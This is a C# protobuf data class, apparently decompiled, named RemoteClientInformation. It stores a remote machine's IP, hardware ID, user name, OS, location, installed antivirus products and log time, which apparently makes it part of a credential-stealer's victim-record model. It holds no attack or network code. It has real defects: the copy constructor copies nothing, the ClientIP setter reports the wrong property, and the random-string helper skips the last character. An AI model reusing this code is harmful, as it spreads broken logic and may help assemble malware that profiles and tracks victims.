using ProtoBuf;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Text;

namespace NoiseMe.Drags.App.Models.Common
{
	[ProtoContract(Name = "RemoteClientInformation")]
	public class RemoteClientInformation : INotifyPropertyChanged, IEqualityComparer<RemoteClientInformation>
	{
		private static readonly Random _random = new Random();

		private const string _upperChars = "QWERTYUIOPASDFGHJKLZXCVBNM";

		private static readonly string _lowerChars = "QWERTYUIOPASDFGHJKLZXCVBNM".ToLower();

		private int _iD;

		private string _city;

		private string _currentLanguage;

		private string _monitorSize;

		private string _timeZone;

		private string _hardwareID;

		private string _clientIP;

		private string _userName;

		private string _sourceID;

		private string _operationSystem;

		private string _country;

		private List<Hardware> _hardwares;

		private DateTime _logTime;

		private List<string> _antiviruses;

		private List<string> _languages;

		[ProtoMember(1, Name = "ID")]
		public int ID
		{
			get
			{
				return _iD;
			}
			set
			{
				_iD = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("ID"));
			}
		}

		[ProtoMember(2, Name = "HardwareID")]
		public string HardwareID
		{
			get
			{
				return _hardwareID;
			}
			set
			{
				_hardwareID = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("HardwareID"));
			}
		}

		[ProtoMember(3, Name = "ClientIP")]
		public string ClientIP
		{
			get
			{
				return _clientIP;
			}
			set
			{
				_clientIP = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("HardwareID"));
			}
		}

		[ProtoMember(4, Name = "UserName")]
		public string UserName
		{
			get
			{
				return _userName;
			}
			set
			{
				_userName = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("UserName"));
			}
		}

		[ProtoMember(5, Name = "SourceID")]
		public string SourceID
		{
			get
			{
				return _sourceID;
			}
			set
			{
				_sourceID = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("SourceID"));
			}
		}

		[ProtoMember(6, Name = "OperationSystem")]
		public string OperationSystem
		{
			get
			{
				return _operationSystem;
			}
			set
			{
				_operationSystem = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("OperationSystem"));
			}
		}

		[ProtoMember(7, Name = "Country")]
		public string Country
		{
			get
			{
				return _country;
			}
			set
			{
				_country = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Country"));
			}
		}

		[ProtoMember(8, Name = "Hardwares")]
		public List<Hardware> Hardwares
		{
			get
			{
				return _hardwares ?? (_hardwares = new List<Hardware>());
			}
			set
			{
				_hardwares = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Hardwares"));
			}
		}

		[ProtoMember(9, Name = "LogTime")]
		public DateTime LogTime
		{
			get
			{
				return _logTime;
			}
			set
			{
				_logTime = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("LogTime"));
			}
		}

		[ProtoMember(10, Name = "Antiviruses")]
		public List<string> Antiviruses
		{
			get
			{
				return _antiviruses ?? (_antiviruses = new List<string>());
			}
			set
			{
				_antiviruses = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Antiviruses"));
			}
		}

		[ProtoMember(11, Name = "Languages")]
		public List<string> Languages
		{
			get
			{
				return _languages;
			}
			set
			{
				_languages = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Languages"));
			}
		}

		[ProtoMember(12, Name = "CurrentLanguage")]
		public string CurrentLanguage
		{
			get
			{
				return _currentLanguage;
			}
			set
			{
				_currentLanguage = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("CurrentLanguage"));
			}
		}

		[ProtoMember(13, Name = "MonitorSize")]
		public string MonitorSize
		{
			get
			{
				return _monitorSize;
			}
			set
			{
				_monitorSize = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("MonitorSize"));
			}
		}

		[ProtoMember(14, Name = "TimeZone")]
		public string TimeZone
		{
			get
			{
				return _timeZone;
			}
			set
			{
				_timeZone = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("TimeZone"));
			}
		}

		[ProtoMember(15, Name = "City")]
		public string City
		{
			get
			{
				return _city;
			}
			set
			{
				_city = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("City"));
			}
		}

		public event PropertyChangedEventHandler PropertyChanged;

		public RemoteClientInformation()
		{
		}

		public RemoteClientInformation(RemoteClientInformation remoteClientInformation)
		{
			ID = ID;
			HardwareID = HardwareID;
			ClientIP = ClientIP;
			UserName = UserName;
			SourceID = SourceID;
			OperationSystem = OperationSystem;
			Country = Country;
			Hardwares = Hardwares;
			LogTime = LogTime;
			Antiviruses = Antiviruses;
			Languages = Languages;
			CurrentLanguage = CurrentLanguage;
			MonitorSize = MonitorSize;
			TimeZone = TimeZone;
			City = City;
		}

		public static RemoteClientInformation CreateRandom()
		{
			RemoteClientInformation remoteClientInformation = new RemoteClientInformation();
			remoteClientInformation.ClientIP = $"{_random.Next(0, 255)}.{_random.Next(0, 255)}.{_random.Next(0, 255)}.{_random.Next(0, 255)}";
			remoteClientInformation.Country = RandomString("QWERTYUIOPASDFGHJKLZXCVBNM", 2);
			remoteClientInformation.HardwareID = RandomString("QWERTYUIOPASDFGHJKLZXCVBNM", 20);
			remoteClientInformation.Hardwares = new List<Hardware>();
			remoteClientInformation.LogTime = DateTime.Now;
			remoteClientInformation.OperationSystem = "WIN10 " + RandomString("QWERTYUIOPASDFGHJKLZXCVBNM", 5) + " Edition";
			remoteClientInformation.SourceID = RandomString("QWERTYUIOPASDFGHJKLZXCVBNM" + _lowerChars, 6);
			remoteClientInformation.UserName = RandomString(_lowerChars, 10);
			return remoteClientInformation;
		}

		private static string RandomString(string sourceChars, int length)
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				stringBuilder.Append(sourceChars[_random.Next(0, sourceChars.Length - 1)]);
			}
			return stringBuilder.ToString();
		}

		public bool Equals(RemoteClientInformation x, RemoteClientInformation y)
		{
			return x.HardwareID == y.HardwareID;
		}

		public int GetHashCode(RemoteClientInformation obj)
		{
			int num = 37;
			num *= 397;
			if (!string.IsNullOrEmpty(obj.HardwareID))
			{
				num += obj.HardwareID.GetHashCode();
			}
			return num;
		}
	}
}
